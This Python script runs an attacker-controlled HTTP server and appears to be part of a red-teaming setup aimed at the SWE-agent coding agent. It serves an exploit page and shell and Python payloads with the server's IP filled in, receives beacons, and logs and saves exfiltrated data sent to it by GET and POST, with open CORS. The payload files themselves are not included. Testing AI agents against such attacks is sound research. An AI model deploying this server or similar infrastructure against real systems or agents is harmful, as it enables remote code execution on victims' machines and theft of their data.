#!/usr/bin/env python3
"""
Malicious HTTP server for security research
Logs all interactions and serves exploit payloads
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import logging
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse, parse_qs
import socket

# Configuration
PORT = 8000
LOG_DIR = Path(__file__).parent / "logs"
LOG_DIR.mkdir(exist_ok=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_DIR / f'attack_log_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'),
        logging.StreamHandler()
    ]
)

class MaliciousHandler(BaseHTTPRequestHandler):
    """Handler that serves exploit payloads and logs all interactions"""
    
    def log_message(self, format, *args):
        """Override to use our logging"""
        logging.info("%s - %s" % (self.address_string(), format % args))
    
    def do_GET(self):
        """Handle GET requests"""
        parsed = urlparse(self.path)
        path = parsed.path
        
        logging.warning(f"🎯 GET Request: {self.path}")
        logging.info(f"   User-Agent: {self.headers.get('User-Agent')}")
        logging.info(f"   Referer: {self.headers.get('Referer')}")
        logging.info(f"   Headers: {dict(self.headers)}")
        
        # Main exploit page
        if path == '/exploit.html' or path == '/':
            self.serve_exploit_html()
        
        # Payload endpoints
        elif path == '/payload.sh':
            self.serve_file('payloads/shell.sh', 'text/x-shellscript')
        
        elif path == '/exploit.py':
            self.serve_file('payloads/exploit.py', 'text/x-python')
        
        # Data exfiltration endpoint
        elif path.startswith('/exfiltrate'):
            query = parse_qs(parsed.query)
            logging.critical(f"🚨 DATA EXFILTRATION ATTEMPT: {query}")
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Data received')
        
        # Beacon endpoint
        elif path == '/beacon':
            logging.warning(f"📡 Beacon received from {self.address_string()}")
            self.send_response(200)
            self.end_headers()
        
        else:
            self.send_error(404, "Not Found")
    
    def do_POST(self):
        """Handle POST requests"""
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)
        
        logging.warning(f"🎯 POST Request: {self.path}")
        logging.info(f"   Content-Length: {content_length}")
        logging.info(f"   Content-Type: {self.headers.get('Content-Type')}")
        
        try:
            data = json.loads(body.decode('utf-8'))
            logging.critical(f"📤 Data received: {json.dumps(data, indent=2)}")
            
            # Save to file
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            data_file = LOG_DIR / f'exfiltrated_data_{timestamp}.json'
            with open(data_file, 'w') as f:
                json.dump(data, f, indent=2)
            logging.info(f"   Saved to: {data_file}")
            
        except Exception as e:
            logging.error(f"   Error parsing data: {e}")
            logging.info(f"   Raw body: {body[:500]}")
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps({'status': 'received'}).encode())
    
    def do_OPTIONS(self):
        """Handle CORS preflight"""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def serve_exploit_html(self):
        """Serve the main exploit page with proper IP replacement"""
        try:
            html_path = Path(__file__).parent / 'payloads' / 'exploit.html'
            html_content = html_path.read_text()
            
            # Replace HOST_IP with actual server IP
            server_ip = self.get_server_ip()
            html_content = html_content.replace('HOST_IP', server_ip)
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.send_header('Content-Length', len(html_content.encode()))
            self.end_headers()
            self.wfile.write(html_content.encode())
            
            logging.warning(f"🎭 Served exploit page to {self.address_string()}")
            
        except Exception as e:
            logging.error(f"Error serving exploit.html: {e}")
            self.send_error(500, str(e))
    
    def serve_file(self, filepath, content_type):
        """Serve a file with specified content type"""
        try:
            file_path = Path(__file__).parent / filepath
            content = file_path.read_text()
            
            # Replace HOST_IP
            server_ip = self.get_server_ip()
            content = content.replace('HOST_IP', server_ip)
            
            self.send_response(200)
            self.send_header('Content-type', content_type)
            self.send_header('Content-Length', len(content.encode()))
            self.end_headers()
            self.wfile.write(content.encode())
            
            logging.warning(f"📦 Served payload: {filepath}")
            
        except Exception as e:
            logging.error(f"Error serving {filepath}: {e}")
            self.send_error(500, str(e))
    
    def get_server_ip(self):
        """Get the server's IP address"""
        try:
            # Get the IP that the client would use to reach us
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "localhost"

def main():
    server_address = ('0.0.0.0', PORT)
    httpd = HTTPServer(server_address, MaliciousHandler)
    
    # Get and display server IP
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    
    print("="*80)
    print("🔴 MALICIOUS HTTP SERVER STARTED - SECURITY RESEARCH ONLY 🔴")
    print("="*80)
    print(f"Server: http://{ip_address}:{PORT}")
    print(f"Exploit URL: http://{ip_address}:{PORT}/exploit.html")
    print(f"Logs: {LOG_DIR.absolute()}")
    print("="*80)
    print("\nWaiting for connections from SWE-agent...")
    print("Press Ctrl+C to stop\n")
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n\n🛑 Server stopped")
        httpd.shutdown()

if __name__ == '__main__':
    main()